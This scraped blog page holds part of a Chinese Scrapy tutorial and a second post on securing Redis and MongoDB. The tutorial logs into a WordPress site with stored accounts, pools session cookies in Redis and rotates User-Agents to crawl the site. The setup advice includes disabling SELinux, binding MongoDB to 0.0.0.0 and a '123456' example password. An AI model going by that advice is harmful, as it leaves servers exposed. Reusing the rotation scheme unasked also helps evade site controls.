                          <pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import redis</span><br><span class="line">import logging</span><br><span class="line"><span class="keyword">from</span> .settings import REDIS_URL</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"><span class="comment">##使用REDIS_URL链接Redis数据库, deconde_responses=True这个参数必须要，数据会变成byte形式 完全没法用</span></span><br><span class="line">reds = redis.Redis.from_url(REDIS_URL, <span class="attribute">db</span>=2, <span class="attribute">decode_responses</span>=<span class="literal">True</span>)</span><br><span class="line">login_url = <span class="string">'http://haoduofuli.pw/wp-login.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##获取Cookie</span></span><br><span class="line">def get_cookie(account, password):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">'log'</span>: account,</span><br><span class="line">        <span class="string">'pwd'</span>: password,</span><br><span class="line">        <span class="string">'rememberme'</span>: <span class="string">"forever"</span>,</span><br><span class="line">        <span class="string">'wp-submit'</span>: <span class="string">"登录"</span>,</span><br><span class="line">        <span class="string">'redirect_to'</span>: <span class="string">"http://http://www.haoduofuli.pw/wp-admin/"</span>,</span><br><span class="line">        <span class="string">'testcookie'</span>: <span class="string">"1"</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = s.post(login_url, <span class="attribute">data</span>=payload)</span><br><span class="line">    cookies = response.cookies.get_dict()</span><br><span class="line">    logger.<span class="builtin-name">warning</span>(<span class="string">"获取Cookie成功！（账号为:%s）"</span> % account)</span><br><span class="line">    return json.dumps(cookies)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这段很好懂吧。 使用 requests 模块提交表单登陆获得 Cookie，返回一个通过 Json 序列化后的 Cookie（如果不序列化，存入 Redis 后会变成 Plain Text 格式的，后面取出来 Cookie 就没法用啦。） 第二个问题：将 Cookie 写入 Redis 数据库（分布式呀，当然得要其它其它 Spider 也能使用这个 Cookie 了）</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">def init_cookie(red, spidername):</span><br><span class="line">    redkeys = reds.keys()</span><br><span class="line">    <span class="keyword">for</span><span class="built_in"> user </span><span class="keyword">in</span> redkeys:</span><br><span class="line">        password = reds.<span class="builtin-name">get</span>(user)</span><br><span class="line">        <span class="keyword">if</span> red.<span class="builtin-name">get</span>(<span class="string">"%s:Cookies:%s--%s"</span> % (spidername, user, password)) is None:</span><br><span class="line">            cookie = get_cookie(user, password)</span><br><span class="line">            red.<span class="builtin-name">set</span>(<span class="string">"%s:Cookies:%s--%s"</span>% (spidername, user, password), cookie)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>使用我们上面建立的 redis 链接获取 redis db2 中的所有 Key(我们设置为账号的哦！)，再从 redis 中获取所有的 Value(我设成了密码哦！) 判断这个 spider 和账号的 Cookie 是否存在，不存在 则调用 get_cookie 函数传入从 redis 中获取到的账号密码的 cookie； 保存进 redis，Key 为 spider 名字和账号密码，value 为 cookie。 这儿操作 redis 的不是上面建立的那个 reds 链接哦！而是 red;后面会传进来的(因为要操作两个不同的 db,我在文档中没有看到切换 db 的方法，只好这么用了，知道的小伙伴儿留言一下)。 spidername 获取方式后面也会说的。 还有剩余的更新 Cookie 删除无法使用的账号等，大家伙可以自己试着写写（写不出来也没关系 不影响正常使用） 好啦！搞定！简直 So Easy!!!! 现在开始大业了！重写 cookie 中间件；估摸着吧！聪明的小伙儿看了上面重写 User-Agent 的方法，十之八九也知道怎么重写 Cookie 中间件了。 好啦，现在继续写 middlewares.py 啦！</p>
                  <figure class="highlight reasonml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">class</span> <span class="constructor">CookieMiddleware(RetryMiddleware)</span>:</span><br><span class="line"></span><br><span class="line">    def <span class="constructor">__init__(<span class="params">self</span>, <span class="params">settings</span>, <span class="params">crawler</span>)</span>:</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">RetryMiddleware</span>.</span><span class="module"><span class="identifier">__init__</span>(</span></span>self, settings)</span><br><span class="line">        self.rconn = redis.from<span class="constructor">_url(<span class="params">settings</span>['REDIS_URL'], <span class="params">db</span>=1, <span class="params">decode_responses</span>=True)</span>##decode_responses设置取出的编码为str</span><br><span class="line">        init<span class="constructor">_cookie(<span class="params">self</span>.<span class="params">rconn</span>, <span class="params">crawler</span>.<span class="params">spider</span>.<span class="params">name</span>)</span></span><br><span class="line"></span><br><span class="line">    @classmethod</span><br><span class="line">    def from<span class="constructor">_crawler(<span class="params">cls</span>, <span class="params">crawler</span>)</span>:</span><br><span class="line">        return cls(crawler.settings, crawler)</span><br><span class="line"></span><br><span class="line">    def process<span class="constructor">_request(<span class="params">self</span>, <span class="params">request</span>, <span class="params">spider</span>)</span>:</span><br><span class="line">        redisKeys = self.rconn.keys<span class="literal">()</span></span><br><span class="line">        <span class="keyword">while</span> len(redisKeys) &gt; <span class="number">0</span>:</span><br><span class="line">            elem = random.choice(redisKeys)</span><br><span class="line">            <span class="keyword">if</span> spider.name + ':Cookies' <span class="keyword">in</span> elem:</span><br><span class="line">                cookie = json.loads(self.rconn.get(elem))</span><br><span class="line">                request.cookies = cookie</span><br><span class="line">                request.meta<span class="literal">["<span class="identifier">accountText</span>"]</span> = elem.split(<span class="string">"Cookies:"</span>)<span class="literal">[-<span class="number">1</span>]</span></span><br><span class="line">                break</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>第一行：不说 第二行第三行得说一下 这玩意儿叫重载（我想了大半天都没想起来叫啥，还是问了大才。尴尬）有啥用呢： 也不扯啥子高深问题了，小伙伴儿可能发现，当你继承父类之后；子类是不能用 def <strong>init</strong>()方法的，不过重载父类之后就能用啦！ 第四行：settings[‘REDIS_URL’]是个什么鬼？这是访问 scrapy 的 settings。怎么访问的？下面说 第五行：往 redis 中添加 cookie。第二个参数就是 spidername 的获取方法（其实就是字典啦！）</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">@classmethod</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_crawler</span><span class="params">(cls, crawler)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> cls(crawler.settings, crawler)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这个貌似不好理解，作用看下面： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/D9DF3655-F28A-482C-8B02-C53B152958A0.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/D9DF3655-F28A-482C-8B02-C53B152958A0.jpg" alt="D9DF3655-F28A-482C-8B02-C53B152958A0"></a> 这样是不是一下就知道了？? 至于访问 settings 的方法官方文档给出了详细的方法： <a href="http://scrapy-chs.readthedocs.io/zh_CN/latest/topics/settings.html#how-to-access-settings" target="_blank" rel="noopener">http://scrapy-chs.readthedocs.io/zh_CN/latest/topics/settings.html#how-to-access-settings</a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ20170207-233701@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/QQ20170207-233701@2x.png" alt="QQ20170207-233701@2x"></a> 下面就是完整的 middlewares.py 文件：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define here the models for your spider middleware</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See documentation in:</span></span><br><span class="line"><span class="comment"># http://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> signals</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> .useragent <span class="keyword">import</span> agents</span><br><span class="line"><span class="keyword">from</span> .cookies <span class="keyword">import</span> init_cookie, remove_cookie, update_cookie</span><br><span class="line"><span class="keyword">from</span> scrapy.downloadermiddlewares.useragent <span class="keyword">import</span> UserAgentMiddleware</span><br><span class="line"><span class="keyword">from</span> scrapy.downloadermiddlewares.retry <span class="keyword">import</span> RetryMiddleware</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAgentmiddleware</span><span class="params">(UserAgentMiddleware)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request, spider)</span>:</span></span><br><span class="line">        agent = random.choice(agents)</span><br><span class="line">        request.headers[<span class="string">"User-Agent"</span>] = agent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CookieMiddleware</span><span class="params">(RetryMiddleware)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, settings, crawler)</span>:</span></span><br><span class="line">        RetryMiddleware.__init__(self, settings)</span><br><span class="line">        self.rconn = redis.from_url(settings[<span class="string">'REDIS_URL'</span>], db=<span class="number">1</span>, decode_responses=<span class="literal">True</span>)<span class="comment">##decode_responses设置取出的编码为str</span></span><br><span class="line">        init_cookie(self.rconn, crawler.spider.name)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_crawler</span><span class="params">(cls, crawler)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> cls(crawler.settings, crawler)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request, spider)</span>:</span></span><br><span class="line">        redisKeys = self.rconn.keys()</span><br><span class="line">        <span class="keyword">while</span> len(redisKeys) &gt; <span class="number">0</span>:</span><br><span class="line">            elem = random.choice(redisKeys)</span><br><span class="line">            <span class="keyword">if</span> spider.name + <span class="string">':Cookies'</span> <span class="keyword">in</span> elem:</span><br><span class="line">                cookie = json.loads(self.rconn.get(elem))</span><br><span class="line">                request.cookies = cookie</span><br><span class="line">                request.meta[<span class="string">"accountText"</span>] = elem.split(<span class="string">"Cookies:"</span>)[<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment">#else:</span></span><br><span class="line">                <span class="comment">#redisKeys.remove(elem)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#def process_response(self, request, response, spider):</span></span><br><span class="line"></span><br><span class="line">         <span class="comment">#"""</span></span><br><span class="line">         <span class="comment">#下面的我删了，各位小伙伴可以尝试以下完成后面的工作</span></span><br><span class="line"></span><br><span class="line">         <span class="comment">#你需要在这个位置判断cookie是否失效</span></span><br><span class="line"></span><br><span class="line">         <span class="comment">#然后进行相应的操作，比如更新cookie  删除不能用的账号</span></span><br><span class="line"></span><br><span class="line">         <span class="comment">#写不出也没关系，不影响程序正常使用，</span></span><br><span class="line"></span><br><span class="line">         <span class="comment">#"""</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>存储我也不写啦！就是这么简单一个分布式的 scrapy 就这么完成啦！！！ 我试了下 三台机器 两个小时 就把整个站点全部爬完了。 弄好你的存储 放在不同的机器上就可以跑啦！ 完整的代码在 GitHub 上： GitHub：<a href="https://github.com/thsheep/haoduofuli" target="_blank" rel="noopener">https://github.com/thsheep/haoduofuli</a> Y(^o^)Y 完工 下篇博文来对付爬虫的大敌：Ajax 以后的教程用微博做靶子，那些数据比较有用，可以玩玩分析什么的。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/哎哟卧槽" class="author" itemprop="url" rel="index">哎哟卧槽</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-02-07 23:53:44" itemprop="dateCreated datePublished" datetime="2017-02-07T23:53:44+08:00">2017-02-07</time>
                </span>
                <span id="/4048.html" class="post-meta-item leancloud_visitors" data-flag-title="小白进阶之Scrapy第三篇（基于Scrapy-Redis的分布式以及cookies池）" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>15k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>14 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/4020.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 技术杂谈 <i class="label-arrow"></i>
                  </a>
                  <a href="/4020.html" class="post-title-link" itemprop="url">Scrapy分布式的前篇--让redis和MongoDB安全点</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>各位小伙伴 大家好啊！年假结束了··· 也该开始继续我的装逼之旅了。 年前博文的结尾说了 还有一个基于 Scrapy 的分布式版本、 今天这博文就先给大家做些前期工作，其实吧、最主要的是防止你的服务器因为这篇博文被轮········· 博文开始之前 我们先来看篇文章： <a href="http://www.youxia.org/daily-news-attack-extortion-does-not-delay-a-week-had-27000-mongodb-database.html" target="_blank" rel="noopener">http://www.youxia.org/daily-news-attack-extortion-does-not-delay-a-week-had-27000-mongodb-database.html</a> 关于年前 MongoDB 由于<strong>默认可匿名访问</strong> 而导致了一大堆的管理员掉坑里 预估中国有十万数据库被坑。 这是继 Redis 之后又一个小白式的错误······（Redis 也是默认匿名访问） 所以在下一篇博文开始之前，先给一些新手小伙伴做一些准备工作。 因为篇幅较少 先写写 Redis 的一些安全设置： 安装 Redis: 请参考这儿;<a href="https://redis.io/download" target="_blank" rel="noopener">https://redis.io/download</a></p>
                  <figure class="highlight gams">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="symbol">$</span> wget http:<span class="comment">//download.redis.io/releases/redis-3.2.7.tar.gz</span></span><br><span class="line"><span class="symbol">$</span> tar xzf redis<span class="number">-3.2</span><span class="number">.7</span>.tar.gz</span><br><span class="line"><span class="symbol">$</span> cd redis<span class="number">-3.2</span><span class="number">.7</span></span><br><span class="line"><span class="symbol">$</span> make</span><br><span class="line"></span><br><span class="line"><span class="symbol">$</span> src/redis-server</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>ps :如果以上有报错，可能是你的服务器没有安装依赖： CentOS7：</p>
                  <figure class="highlight brainfuck">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment">yum</span> <span class="comment">install</span> <span class="literal">-</span><span class="comment">y</span> <span class="comment">gcc</span><span class="literal">-</span><span class="comment">c</span>++ <span class="comment">tcl</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>只写关于 Linux 的、Windows 的很简单，配置文件通用： 安装完成后 在目录 redis-3.2.7 中有一个 redis.conf 的配置文件，按照默认习惯我们将其复制到/etc 目录下：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">[<span class="symbol">root@</span>MyCloudServer ~]# cp redis<span class="number">-3.2</span><span class="number">.7</span>/redis.conf /etc</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>PS：请使用复制（cp）而不要使用移动（mv）；毕竟你要弄错了还可以再拷贝一份儿过去用不是？ 使用 vim 编辑刚刚拷贝的 redis.conf</p>
                  <figure class="highlight vim">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">vim</span> /etc/redis.<span class="keyword">conf</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>PS:使用 vim 需要先安装： CentOS7：</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">yum  <span class="keyword">install</span> vim</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>我们需要注意以下几项： 1、注释掉 47 行的 bind 127.0.0.1（这个意思是限制为只能 127.0.0.1 也就是本机登录）PS：个人更建议 将你需要连接 Redis 数据库的 IP 地址填写在此处，而不是注释掉。这样做会比直接注释掉更加安全。 2、更改第 84 行 port 6379 为你需要的端口号（这是 Redis 的默认监听端口）PS：个人建议务必更改 3、更改第 128 行 daemonize no 为 daemonize yes（这是让 Redis 后台运行） PS:个人建议更改 4、取消第 480 # requirepass foobared 的#注释符（这是 redis 的访问密码） 并更改 foobared 为你需要的密码 比如 我需们需要密码为 123456 则改为 requirepass 123456。PS：密码不可过长否则 Python 的 redis 客户端无法连接 以上配置文件更改完毕，需要在防火墙放行：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">firewall-cmd <span class="attribute">--zone</span>=public <span class="attribute">--add-port</span>=xxxx/tcp --permanent</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>请将 xxxx 更改为你自己的 redis 端口。 重启防火墙生效：</p>
                  <figure class="highlight css">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="selector-tag">systemctl</span> <span class="selector-tag">restart</span> <span class="selector-tag">firewalld</span><span class="selector-class">.service</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>指定配置文件启动 redis:</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">[<span class="symbol">root@</span>MyCloudServer ~]# redis<span class="number">-3.2</span><span class="number">.7</span>/src/redis-server /etc/redis.conf</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>加入到开机启动:</p>
                  <figure class="highlight jboss-cli">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">echo</span> <span class="string">"/root/redis-3.2.6/src/redis-server /etc/redis.conf"</span> &gt;&gt; <span class="string">/etc/rc.local</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>一个较为安全的 redis 配置完毕。 redis 的桌面客户端我推荐：RedisDesktopManager 去下面这个地址下载就不需要捐助啦！ <a href="https://github.com/uglide/RedisDesktopManager/releases" target="_blank" rel="noopener">https://github.com/uglide/RedisDesktopManager/releases</a> 当然还有一些其他配置、我们用不到也就不写啦！ <strong>MongoDB：</strong> 这次 MongoDB 挺惨啊！由于默认匿名访问、下面给 MongoDB 配置一点安全措施： 安装 MongoDB： 以 CentOS7 为例其余发行版请参考官方文档：<a href="https://docs.mongodb.com/manual/administration/install-on-linux/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/administration/install-on-linux/</a> 1、建一个 yum 源：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">[<span class="symbol">root@</span>MyCloudServer ~]# vim /etc/yum.repos.d/mongodb-org<span class="number">-3.4</span>.repo</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>写入以下内容：</p>
                  <figure class="highlight ini">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="section">[mongodb-org-3.4]</span></span><br><span class="line"><span class="attr">name</span>=MongoDB Repository</span><br><span class="line"><span class="attr">baseurl</span>=https://repo.mongodb.org/yum/redhat/<span class="variable">$releasever</span>/mongodb-org/<span class="number">3.4</span>/x<span class="number">86_64</span>/</span><br><span class="line"><span class="attr">gpgcheck</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">enabled</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">gpgkey</span>=https://www.mongodb.org/static/pgp/server-<span class="number">3.4</span>.asc</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>2、安装 mongoDB 以及相关工具：</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">sudo yum <span class="keyword">install</span> -y mongodb-org</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>3、启动 MongoDB：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">sudo<span class="built_in"> service </span>mongod start</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>ＰＳ：如果你的服务器在使用 SELinux 的话，你需要配置 SElinux 允许 MongoDB 启动，当然更简单的方法是关掉 SElinux。 关闭 SElinux:</p>
                  <figure class="highlight autoit">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">[root<span class="symbol">@MyCloudServer</span> ~]<span class="meta"># vim /etc/selinux/config</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>将第 7 行设置为：SELINUX=disabled 4、停止 MongoDB：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">sudo<span class="built_in"> service </span>mongod stop</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>上面安装完按成了 MongoDB 下面要步入正题了： 1、备份和更改配置文件：</p>
                  <figure class="highlight vim">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">[root@MyCloudServer ~]# <span class="keyword">cp</span> /etc/mongod.<span class="keyword">conf</span>  /etc/mongod_backup.<span class="keyword">conf</span></span><br><span class="line">[root@MyCloudServer ~]# <span class="keyword">vim</span> /etc/mongod.<span class="keyword">conf</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>更改第 28 行 prot 2701 为你需要更改的端口（这是 MongoDB 默认的监听端口） 更改第 29 行 bindIp: 127.0.0.1 为 0.0.0.0（MongoDB 默认只能本地访问）ＰＳ：个人建议此处添加你需要连接 MongoDB 服务器的 IP 地址、而不是改成 0.0.0.0。这样做会更安全 启动 MongoDB：</p>
                  <figure class="highlight jboss-cli">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">mongod <span class="params">--config</span> <span class="string">/etc/mongod.conf</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>意思是：指定/etc/mongod.conf 为配置文件启动 MongoDB 好了、配置文件更改完毕，现在可以外网访问我们的 MongoDB 了！不需要用户名！匿名的！现在我们进行下一步设置。 因为 MongoDB 默认是匿名访问的、我们需要开启用户认证。 我估摸着很多哥们儿和我一样没补全 啥都不会干、所以直接在服务器上改就不太现实了，需要借助于第三方客户端。我个人推荐：mongobooster 官方地址：<a href="https://mongobooster.com/" target="_blank" rel="noopener">https://mongobooster.com/</a> 收费版免费版功能一样 不用在意： 首先我们需要连上 MongoDB 服务器（别忘了防火墙放行你使用的端口啊！！！） <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/170203.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/170203.gif" alt="170203"></a> 连上之后大慨是这个样子： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/17020301.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/02/17020301.png" alt="17020301"></a> 按下 Ctrl+T 打开 shell 界面输入一下内容：</p>
                  <figure class="highlight gherkin">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                        </td>
                        <td class="code">
